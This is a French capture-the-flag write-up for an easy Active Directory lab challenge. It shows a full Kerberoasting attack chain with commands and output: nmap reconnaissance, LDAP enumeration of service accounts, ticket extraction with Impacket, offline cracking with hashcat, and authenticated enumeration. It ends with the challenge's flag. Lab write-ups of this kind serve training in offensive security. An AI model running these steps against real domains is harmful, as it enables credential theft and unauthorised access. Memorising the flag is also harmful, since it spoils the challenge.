# The AD Guardians

**Catégorie** : Active Directory/Réaliste  
**Difficulté** : Facile  
**Author**: HF47

## Description du challenge

Dans les profondeurs du royaume Active Directory, une ancienne prophétie parle d'un artefact caché protégé par des gardiens invisibles. Seuls ceux qui maîtrisent l'art de la négociation des tickets pourront espérer découvrir le secret enfoui dans les méandres de l'annuaire.

## Solution

### 1. Reconnaissance initiale

Commençons par identifier les services disponibles sur le réseau :

```bash
hf47@kali> nmap -sV -p- 192.168.56.4
Nmap scan report for 192.168.56.4
Host is up (0.00056s latency).
Not shown: 986 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Microsoft Windows Server 2016 Essentials microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Nous remarquons la présence d'un serveur SQL (port 1433) et des services AD classiques (LDAP, Kerberos).

### 2. Énumération des comptes de service

Utilisons `ldapsearch` pour identifier les comptes de service avec des SPN configurés :

```bash
hf47@kali> ldapsearch -x -H ldap://192.168.56.4 -b "DC=ctfcorp,DC=local" "(servicePrincipalName=*)"
# sql_service, Users, ctfcorp.local
dn: CN=sql_service,CN=Users,DC=ctfcorp,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: sql_service
sAMAccountName: sql_service
servicePrincipalName: MSSQLSvc/dc1.ctfcorp.local:1433
```

Nous avons identifié un compte de service SQL avec un SPN configuré.

### 3. Kerberoasting

Utilisons `GetUserSPNs.py` d'Impacket pour extraire le ticket Kerberos :

```bash
hf47@kali> GetUserSPNs.py ctfcorp.local/<USERNAME>:<PASSWORD> -dc-ip 192.168.56.4 -request-user sql_service -outputfile hashes.kerberos
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name        MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  ----------  --------  --------------------------  ---------  ----------
MSSQLSvc/dc1.ctfcorp.local:1433  sql_service            2024-05-23 10:15:21.000             

$krb5tgs$23$*sql_service$CTFCORP.LOCAL$MSSQLSvc/dc1.ctfcorp.local:1433*$a7d4...[SNIP]
```

### 4. Cracking du hash

Sauvegardons le hash dans un fichier `hashes.kerberos` et utilisons hashcat avec `rockyou.txt` pour le cracker :

```bash
hf47@kali> hashcat -m 13100 hashes.kerberos /usr/share/wordlists/rockyou.txt
[...] 
$krb5tgs$23$*sql_service$CTFCORP.LOCAL$MSSQLSvc/dc1.ctfcorp.local:1433*:[SNIP]:fantastic
```

Le mot de passe du compte de service est : `fantastic`

### 5. Énumération avec le compte compromis

Maintenant que nous avons les credentials du compte de service, utilisons-les pour énumérer l'AD de manière méthodique :

```bash
# D'abord, listons toutes les OUs du domaine
hf47@kali> ldapsearch -x -H ldap://192.168.56.4 -D "sql_service@ctfcorp.local" -w "fantastic" -b "DC=ctfcorp,DC=local" "(objectClass=organizationalUnit)" dn

# Hidden_Services, ctfcorp.local
dn: OU=Hidden_Services,DC=ctfcorp,DC=local

# Users, ctfcorp.local
dn: CN=Users,DC=ctfcorp,DC=local

# Computers, ctfcorp.local
dn: CN=Computers,DC=ctfcorp,DC=local

# Domain Controllers, ctfcorp.local
dn: OU=Domain Controllers,DC=ctfcorp,DC=local

# Nous remarquons une OU nommée "Hidden_Services" qui semble intéressante
# Explorons son contenu
hf47@kali> ldapsearch -x -H ldap://192.168.56.4 -D "sql_service@ctfcorp.local" -w "fantastic" -b "OU=Hidden_Services,DC=ctfcorp,DC=local" "(objectClass=*)"

# Hidden_Services, ctfcorp.local
dn: OU=Hidden_Services,DC=ctfcorp,DC=local
objectClass: top
objectClass: organizationalUnit
ou: Hidden_Services

# 404CTF{K3rb3r04st1ng_1s_Th3_W4y}, Hidden_Services, ctfcorp.local
dn: CN=404CTF{K3rb3r04st1ng_1s_Th3_W4y},OU=Hidden_Services,DC=ctfcorp,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: 404CTF{K3rb3r04st1ng_1s_Th3_W4y}
```

Nous avons découvert une OU nommée "Hidden_Services" qui contient un compte utilisateur dont le nom correspond au format d'un flag CTF.

### 6. Flag

Le flag est le nom du compte caché : `404CTF{K3rb3r04st1ng_1s_Th3_W4y}`
